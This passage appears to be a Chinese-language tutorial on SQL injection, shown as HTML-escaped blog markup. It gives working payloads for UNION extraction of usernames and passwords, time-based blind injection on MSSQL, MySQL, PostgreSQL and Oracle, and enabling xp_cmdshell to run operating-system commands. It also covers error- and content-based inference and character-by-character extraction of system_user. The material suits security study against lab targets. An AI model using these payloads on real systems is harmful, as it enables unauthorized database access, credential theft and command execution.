&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-2/?id=0 union select NULL,username,password from users limit 1,1 -- &lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 加一个限制条件返回第二条数据，where也行&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;使用条件语句&#34;&gt;&lt;a href=&#34;#使用条件语句&#34; class=&#34;headerlink&#34; title=&#34;使用条件语句&#34;&gt;&lt;/a&gt;使用条件语句&lt;/h3&gt;&lt;p&gt;构建条件语句，条件语句的执行结果强迫服务器返回不同的结果，由结果的状态来判断条件是否为真&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/ad493d6543d96db885d9a1428870d1ea.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;基于时间&#34;&gt;&lt;a href=&#34;#基于时间&#34; class=&#34;headerlink&#34; title=&#34;基于时间&#34;&gt;&lt;/a&gt;基于时间&lt;/h4&gt;&lt;p&gt;基于Web应用响应时间上的差异，该时间取决于某些信息的值。&lt;/p&gt;
&lt;h5 id=&#34;mssql&#34;&gt;&lt;a href=&#34;#mssql&#34; class=&#34;headerlink&#34; title=&#34;mssql&#34;&gt;&lt;/a&gt;mssql&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; @&lt;span class=&#34;token variable&#34;&gt;@version&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
Microsoft &lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; Server &lt;span class=&#34;token number&#34;&gt;2005&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;9.00&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.3042&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.00&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Intel X86&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
Feb &lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2007&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;22&lt;/span&gt;:&lt;span class=&#34;token number&#34;&gt;47&lt;/span&gt;:&lt;span class=&#34;token number&#34;&gt;07&lt;/span&gt;
Copyright &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1988&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2005&lt;/span&gt; Microsoft Corporation 
Standard Edition &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; Windows NT &lt;span class=&#34;token number&#34;&gt;5.2&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Build &lt;span class=&#34;token number&#34;&gt;3790&lt;/span&gt;: Service Pack &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12;if+(system_user=&#39;sa&#39;)+WAITFOR+DELAY+&#39;0:0:5&#39;-- &lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 若system_user用户是系统管理员账户&#39;sa&#39;,则会执行后面的waitfor delay函数，页面延迟5s&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;IF&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;substring&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; @&lt;span class=&#34;token variable&#34;&gt;@version&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WAITFOR&lt;/span&gt; DELAY &lt;span class=&#34;token string&#34;&gt;&#39;0:0:5&#39;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 截取@@version的第25个字符是否为5，为5就是2005数据库，并且延迟返回&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;跑个脚本能把这一整段跑出来，精确判断，判断补丁，利用补丁攻击&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/611e433cc3ffdeba5e68dcaaa0a90f0d.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.sqlteam.com/articles/sql-server-versions&#34;&gt;SQL Server Version - SQLTeam.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果有管理员权限，可以使用xp_cmdshell扩展储存过程来产生延迟，它通过加载一条需要花费特定秒数的命令来实现。&lt;/p&gt;
&lt;p&gt;启用xp_cmdshell&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- sql server 2005 2008&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;token string&#34;&gt;&#39;show advanced options&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
GO
&lt;span class=&#34;token keyword&#34;&gt;RECONFIGURE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;token string&#34;&gt;&#39;xp_cmdshell*&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- sql server 2000&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sp_addextendedproc &lt;span class=&#34;token string&#34;&gt;&#39;xp_cmdshell&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;xplog70.dll&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;xp_cmdshell &lt;span class=&#34;token string&#34;&gt;&#39;ping -n 5 127.0.0.1&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- ping回路5s&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;mysql&#34;&gt;&lt;a href=&#34;#mysql&#34; class=&#34;headerlink&#34; title=&#34;mysql&#34;&gt;&lt;/a&gt;mysql&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; benchmark&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1000000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;sha1&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;blah&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 执行后面的语句1000000次&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 睡眠5s 配合if使用&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;PostgreSQL&#34;&gt;&lt;a href=&#34;#PostgreSQL&#34; class=&#34;headerlink&#34; title=&#34;PostgreSQL&#34;&gt;&lt;/a&gt;PostgreSQL&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; pg_sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- unix&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;REPLACE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FUNCTION&lt;/span&gt; sleep &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;RETURNS&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/lib/libc.so.6&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;sleep&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;language&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C&#39;&lt;/span&gt; STRICT&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;oracle&#34;&gt;&lt;a href=&#34;#oracle&#34; class=&#34;headerlink&#34; title=&#34;oracle&#34;&gt;&lt;/a&gt;oracle&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; utl_http&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;request &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; http://10.0.0.1/ &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dual&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; HTTPURITYPE&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; http://10.0.0.1/ &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;getclob&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dual&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 使用UTL HTTP或HTTPURITYPE向一个&#39;死的&#39;IP地址发送一个HTTP请求查询将一直等待连接直到超时&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; all_objects&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;all_objects&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;all_objects&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;all_objects&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 笛卡尔积&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;基于错误&#34;&gt;&lt;a href=&#34;#基于错误&#34; class=&#34;headerlink&#34; title=&#34;基于错误&#34;&gt;&lt;/a&gt;基于错误&lt;/h4&gt;&lt;p&gt;返回两种状态，其中一种状态是错误&lt;/p&gt;
&lt;p&gt;sql server&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12/is_srvrolemember(&#39;sysadmin&#39;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;is_srvrolemember()是SQL Server T-SQL的一个函数，返回&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;：如果用户属于指定的组。
&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;：如果用户不属于指定的组。
NULL：如果指定的组不存在。&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;意思很明确，返回1的话就会拼接成12/1,id=12会返回结果，0则报错，具体报错不深究&lt;/p&gt;
&lt;p&gt;case语句也能这样使用，堆叠不能用它都能用&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12/(case+when+(system_user=&#39;sa&#39;)+then+1+else+0+end)&lt;/span&gt;

http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-2/?id=12/(if(1=1,1,0))&lt;/span&gt;

http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-2/?id=12/(case 1 when 1 then 1 else 0 end)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;基于内容&#34;&gt;&lt;a href=&#34;#基于内容&#34; class=&#34;headerlink&#34; title=&#34;基于内容&#34;&gt;&lt;/a&gt;基于内容&lt;/h4&gt;&lt;p&gt;执行语句返回内容和不执行返回的内容不同，相比于基于时间，基于错误会更快，基于内容不会产生错误，有点不言而喻。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-2/?id=10%2B(if(1=1,1,0))&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 若成功执行if语句,就会返回id=11的结果，对比10不同&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;处理字符串&#34;&gt;&lt;a href=&#34;#处理字符串&#34; class=&#34;headerlink&#34; title=&#34;处理字符串&#34;&gt;&lt;/a&gt;处理字符串&lt;/h4&gt;&lt;p&gt;前面介绍的都是数值上的技术，这段介绍字符上的技巧&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 正常查询，id=13时结果为空，sql语句为&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;12&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=1&#39;%2B&#39;2&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 结果和上面相同，因为连接成了12&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这时可以将char()函数放在2的位置测试&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=1&#39;%2Bchar(50)&#39;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&#39;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;执行结果和前面相同，这是可以将条件语句插入2的位置&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=1&#39;%2Bchar(49%2B(case+when+(system_user+=+&#39;sa&#39;)+then+l+else+0+end))&#39;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;-- 如果是sa执行后id=13，不是则id=12&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;根据结果的不同可以判断条件&lt;/p&gt;
&lt;h4 id=&#34;拓展攻击&#34;&gt;&lt;a href=&#34;#拓展攻击&#34; class=&#34;headerlink&#34; title=&#34;拓展攻击&#34;&gt;&lt;/a&gt;拓展攻击&lt;/h4&gt;&lt;p&gt;简而言之，不在局限于判断sa用户了，而是得到所有信息，先得到用户名长度&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12/(case+when+(len(system_user)+&amp;gt;+16)+then+1+else+0+end)&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12/(case+when+(len(system_user)+&amp;gt;+12)+then+1+else+0+end)&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12/(case+when+(len(system_user)+&amp;gt;+10)+then+1+else+0+end)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 二分查找，错误和成功的交界就是正确的值&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接下一次查找组成用户名的每个值&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12/(case+when+(ascii(substring(select+system_user),1,1))+&amp;gt;+64)+then+1+else+0+end)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 二分查找&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这些过程一般都交给自动化脚本&lt;/p&gt;
&lt;h4 id=&#34;利用SQL注入错误&#34;&gt;&lt;a href=&#34;#利用SQL注入错误&#34; class=&#34;headerlink&#34; title=&#34;利用SQL注入错误&#34;&gt;&lt;/a&gt;利用SQL注入错误&lt;/h4&gt;&lt;p&gt;将检索的信息注入进报错信息中&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/products.asp?id=system_user&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

